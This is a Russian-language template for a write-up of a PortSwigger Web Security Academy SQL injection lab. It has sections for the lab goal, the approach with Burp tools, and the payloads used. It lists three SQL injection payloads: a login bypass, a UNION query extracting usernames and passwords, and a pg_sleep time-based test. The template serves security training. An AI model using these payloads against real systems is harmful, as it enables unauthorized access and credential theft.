# Lab: [Название лаборатории]

📍 **Источник:** PortSwigger Web Security Academy  
🔗 **Ссылка:** [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

---

## 📌 Цель лаборатории

> Краткое описание цели: что нужно найти/взломать и каким образом.  
> Например: обойти логин, извлечь данные из скрытых товаров, определить структуру БД.

---

## 🚀 Подход

1. Провел ручной анализ параметров запроса (`id=`, `category=`, `username=`, и т.п.).
2. Внёс тестовые инъекции `'` и `' OR 1=1--`, посмотрел поведение.
3. Использовал **Burp Repeater** и **Burp Proxy** для точной настройки запроса.
4. Выбрал тип атаки: `UNION`, `error-based`, `blind`, `time-based`.
5. Сформировал payload с учетом количества колонок/данных.
6. Получил нужную информацию / добился цели.

---

## 💣 Использованные payload’ы

```sql
' OR 1=1--  
' UNION SELECT null, username, password FROM users--  
' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--  
